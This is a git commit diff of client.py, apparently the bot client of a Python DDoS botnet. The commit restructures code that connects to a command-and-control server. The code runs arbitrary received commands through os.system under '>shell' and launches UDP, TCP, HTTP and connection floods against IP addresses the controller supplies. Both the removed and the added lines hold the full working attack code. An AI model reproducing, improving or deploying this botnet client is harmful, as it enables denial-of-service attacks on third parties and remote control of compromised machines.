2030fe86f17c19e00fa5a37935b1c5af601a3106
Law <36631640+LawOfTime@users.noreply.github.com>
2018-08-02 13:17:26 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,5 +1,4 @@
-# Please do not change ANYTHING. As it may mess everything up.
-# Also, I am a frickin genius!
+# This was programmed by Feitan alone. All suggestions are welcome, (A part from the ones that ask for functions from RATs)
 import os
 import sys
 import time
@@ -59,234 +58,227 @@ try:
 except:
 	pass
 
-def system():
-	global sock
-	global connected
+while not connected:
+	try:
+		sock.connect((host, port))
+		sock.send(bytes("Data"))
+		connected = True
+		print("Connected")
+	except:
+		pass
+		
+while connected is True:
+	try:
+		def commands():
+			global attk
+			global active
 
-	while not connected:
-		try:
-			sock.connect((host, port))
+			msg = sock.recv(512)
 			sock.send(bytes("Data"))
-			connected = True
-		except:
-			pass
-			
-	while connected is True:
-		try:
-			def commands():
-				global attk
-				global active
 
-				msg = sock.recv(1024)
-				sock.send(bytes("Data"))
-				
-				if "46617043704647071717889523522" in msg:
-					sys.exit()
-
-				if ">killbots" in msg.lower():
-					try:
-						sys.exit()
-					except:
-						pass
-
-				if ">shell" in msg.lower():
-					try:
-						shell = msg[7:]
-						os.system(shell)
-					except:
-						pass
-
-				if ">udp" in msg.lower():
-					def udpflood():
-						global attk
-						global active
-						try:
-							def udpflooder():
-								try:
-									udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
-									port = random.randint(1, 65535)
-									udpflood.sendto(package, (ip, port))
-								except:
-									pass
-
-							ip = msg.split(" ")[1]
-							psize = int(msg.split(" ")[2])
-							timer = int(float(msg.split(" ")[3]))
-
-							timeout = time.time() + 1 * timer
-
-							package = random._urandom(psize)
-
-							print("Command Accepted!")
-							print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
-							active += 1
-
-							while True:
-								thread = threading.Thread(target=udpflooder)
-								thread.Deamon = True
-								thread.start()
-								thread.join()
-								if time.time() > timeout:
-									active -= 1
-									return
-								if attk == False:
-									active -= 1
-									print("UDP: Attack Killed!")
-									return
-						except:
-							pass
-					udpflood()
-
-				if ">tcp" in msg.lower():
-					def tcpflood():
-						global attk
-						global active
-						try:
-							def tcpflooder():
-								try:
-									tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-									tcpflood.connect((ip, 80))
-									port = random.randint(1, 65535)
-									tcpflood.sendto(package, (ip, port))
-									tcpflood.close()
-								except:
-									pass
-
-							ip = msg.split(" ")[1]
-							psize = int(msg.split(" ")[2])
-							timer = int(float(msg.split(" ")[3]))
-
-							timeout = time.time() + 1 * timer
-
-							package = random._urandom(psize)
-
-							print("Command Accepted!")
-							print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
-							active += 1
-
-							while True:
-								thread = threading.Thread(target=tcpflooder)
-								thread.Deamon = True
-								thread.start()
-								thread.join()
-								if time.time() > timeout:
-									active -= 1
-									return
-								if attk == False:
-									active -= 1
-									print("TCP: Attack Killed!")
-									return
-						except:
-							pass
-					tcpflood()
-
-				if ">http" in msg.lower():
-					def httpflood():
-						global attk
-						global active
-						try:
-							def httpflooder():
-								try:
-									sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-									resolvedHost = socket.gethostbyname(ip)
-
-									query = str("GET / HTTP/1.1\nHost: "+resolvedHost+"\n\nUser-Agent: "+random.choice(userAgents)+"\n"+headers).encode("utf-8")
-									sock.connect((resolvedHost, 80))
-									sock.sendall(query)
-									sock.close()
-								except:
-									pass
-
-							ip = msg.split(" ")[1]
-							threads = int(msg.split(" ")[2])
-							timer = int(float(msg.split(" ")[3]))
-
-							timeout = time.time() + 1 * timer
-
-							print("Command Accepted!")
-							print("HTTP: Sent to %s with %s threads for %s seconds!" % (ip, threads, timer))
-							active += 1
-
-							while True:
-								for x in range(threads):
-									thread = threading.Thread(target=httpflooder)
-									thread.Deamon = True
-									thread.start()
-									thread.join()
-									if time.time() > timeout:
-										active -= 1
-										return
-									if attk == False:
-										active -= 1
-										print("HTTP: Attack Killed!")
-										return
-						except:
-							pass
-					httpflood()
-
-				if ">cnc" in msg.lower():
-					def cncflood():
-						global attk
-						global active
-						try:
-							def cncflooder():
-								try:
-									cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-									cnc.connect((ip, port))
-									cnc.close()
-								except:
-									pass
-
-							ip = msg.split(" ")[1]
-							port = int(msg.split(" ")[2])
-							amount = int(msg.split(" ")[3])
-
-							print("Command Accepted!")
-							print("CNC: Sent to %s on port %s %s times!" % (ip, port, amount))
-							active += 1
-
-							for x in range(amount):
-								thread = threading.Thread(target=cncflooder)
-								thread.Deamon = True
-								thread.start()
-								thread.join()
-								if attk == False:
-									active -= 1
-									print("CNC: Attack Killed!")
-									return
-							active -= 1
-						except:
-							pass
-					cncflood()
-
-				if ">killattk" in msg.lower():
-					try:
-						attk = False
-					except:
-						pass
-
-				if active == 0:
-					try:
-						attk = True
-					except:
-						pass
-
-			commands()
-			threads = []
-			for i in range(100):
-			    thread = threading.Thread(target=commands)
-			    threads.append(thread)
-			    thread.setDaemon(True)
-			    thread.start()
-			    
-		except socket.error:
-			connected = False
-			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			while not connected:
+			if msg.lower().startswith(">killbots"):
 				try:
-					sock.connect((host, port))
-					connected = True
-				except socket.error:
+					sys.exit()
+				except:
 					pass
-	sock.close()
-system()
+
+			if msg.lower().startswith(">shell"):
+				try:
+					shell = msg[7:]
+					os.system(shell)
+				except:
+					pass
+
+			if msg.lower().startswith(">udp"):
+				def udpflood():
+					global attk
+					global active
+					try:
+						def udpflooder():
+							try:
+								udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
+								port = random.randint(1, 65535)
+								udpflood.sendto(package, (ip, port))
+							except:
+								pass
+
+						ip = msg.split(" ")[1]
+						psize = int(msg.split(" ")[2])
+						timer = int(float(msg.split(" ")[3]))
+
+						timeout = time.time() + 1 * timer
+
+						package = random._urandom(psize)
+
+						print("Command Accepted!")
+						print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+						active += 1
+
+						while True:
+							thread = threading.Thread(target=udpflooder)
+							thread.Deamon = True
+							thread.start()
+							thread.join()
+							if time.time() > timeout:
+								active -= 1
+								return
+							if attk == False:
+								active -= 1
+								print("UDP: Attack Killed!")
+								return
+					except:
+						pass
+				udpflood()
+
+			if msg.lower().startswith(">tcp"):
+				def tcpflood():
+					global attk
+					global active
+					try:
+						def tcpflooder():
+							try:
+								tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+								tcpflood.connect((ip, 80))
+								port = random.randint(1, 65535)
+								tcpflood.sendto(package, (ip, port))
+								tcpflood.close()
+							except:
+								pass
+
+						ip = msg.split(" ")[1]
+						psize = int(msg.split(" ")[2])
+						timer = int(float(msg.split(" ")[3]))
+
+						timeout = time.time() + 1 * timer
+
+						package = random._urandom(psize)
+
+						print("Command Accepted!")
+						print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+						active += 1
+
+						while True:
+							thread = threading.Thread(target=tcpflooder)
+							thread.Deamon = True
+							thread.start()
+							thread.join()
+							if time.time() > timeout:
+								active -= 1
+								return
+							if attk == False:
+								active -= 1
+								print("TCP: Attack Killed!")
+								return
+					except:
+						pass
+				tcpflood()
+
+			if msg.lower().startswith(">http"):
+				def httpflood():
+					global attk
+					global active
+					try:
+						def httpflooder():
+							try:
+								sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+								resolvedHost = socket.gethostbyname(ip)
+
+								query = str("GET / HTTP/1.1\nHost: "+resolvedHost+"\n\nUser-Agent: "+random.choice(userAgents)+"\n"+headers).encode("utf-8")
+								sock.connect((resolvedHost, 80))
+								sock.sendall(query)
+								sock.close()
+							except:
+								pass
+
+						ip = msg.split(" ")[1]
+						threads = int(msg.split(" ")[2])
+						timer = int(float(msg.split(" ")[3]))
+
+						timeout = time.time() + 1 * timer
+
+						print("Command Accepted!")
+						print("HTTP: Sent to %s with %s threads for %s seconds!" % (ip, threads, timer))
+						active += 1
+
+						while True:
+							for x in range(threads):
+								thread = threading.Thread(target=httpflooder)
+								thread.Deamon = True
+								thread.start()
+								thread.join()
+								if time.time() > timeout:
+									active -= 1
+									return
+								if attk == False:
+									active -= 1
+									print("HTTP: Attack Killed!")
+									return
+					except:
+						pass
+				httpflood()
+
+			if msg.lower().startswith(">cnc"):
+				def cncflood():
+					global attk
+					global active
+					try:
+						def cncflooder():
+							try:
+								cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+								cnc.connect((ip, port))
+								cnc.close()
+							except:
+								pass
+
+						ip = msg.split(" ")[1]
+						port = int(msg.split(" ")[2])
+						amount = int(msg.split(" ")[3])
+
+						print("Command Accepted!")
+						print("CNC: Sent to %s on port %s %s times!" % (ip, port, amount))
+						active += 1
+
+						for x in range(amount):
+							thread = threading.Thread(target=cncflooder)
+							thread.Deamon = True
+							thread.start()
+							thread.join()
+							if attk == False:
+								active -= 1
+								print("CNC: Attack Killed!")
+								return
+						active -= 1
+					except:
+						pass
+				cncflood()
+
+			if msg.lower().startswith(">killattk"):
+				try:
+					attk = False
+				except:
+					pass
+
+			if active == 0:
+				try:
+					attk = True
+				except:
+					pass
+		commands()
+
+		for i in range(100):
+		    thread = threading.Thread(target=commands, args=(""), name='Command Handler')
+		    thread.setDaemon(True)
+		    thread.start()
+		    
+	except socket.error:
+		connected = False
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		print("Disconnected")
+		while not connected:
+			try:
+				sock.connect((host, port))
+				connected = True
+				print("Reconnected")
+			except socket.error:
+				pass
+sock.close()
